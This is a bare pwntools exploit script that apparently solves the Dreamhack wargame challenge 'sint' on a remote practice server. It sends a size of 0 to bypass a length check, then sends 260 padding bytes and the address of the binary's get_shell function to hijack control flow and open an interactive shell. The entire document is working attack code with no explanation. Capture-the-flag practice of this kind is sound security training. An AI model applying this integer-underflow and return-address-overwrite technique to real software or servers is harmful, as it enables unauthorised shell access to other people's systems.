from pwn import *

exe = ELF('./sint', checksec=False)
# p = process(exe.path)
p = remote("host1.dreamhack.games", 16908)

input()

p.sendlineafter(b'Size: ', b'0')
payload = b'a'*260 + p64(exe.sym['get_shell'])
p.sendlineafter(b'Data: ', payload)

p.interactive()